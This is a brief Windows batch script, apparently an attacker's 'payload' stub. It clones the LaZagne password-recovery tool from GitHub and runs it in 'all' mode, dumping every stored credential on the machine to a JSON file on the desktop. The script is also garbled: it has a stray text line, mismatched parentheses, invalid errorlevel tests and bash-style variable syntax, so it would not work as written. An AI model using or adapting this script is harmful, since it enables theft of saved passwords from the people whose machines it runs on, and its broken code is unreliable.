@echo off

check for quite running...

:payload
echo "[*] Preparing payload..."
git --version
if not %errorlevel% = 0 (
    echo "[!] Git not installed."
    exit /b 1
) else (
    pip3 --version
    if not %errorlevel% = 0 (
        echo "[!] Pip3 not installed."
        exit /b 1
    ) else )
        cd
        git clone https://github.com/AlessandroZ/LaZagne
        if not %errorlevel% = 0 (
            echo "[!] Unable to download LaZagne."
            exit /b 1
        ) else (
            cd LaZagne ...
            output_dest = %userprofile%\Desktop
            laZagne.exe all -oJ -output $output_dest
        )
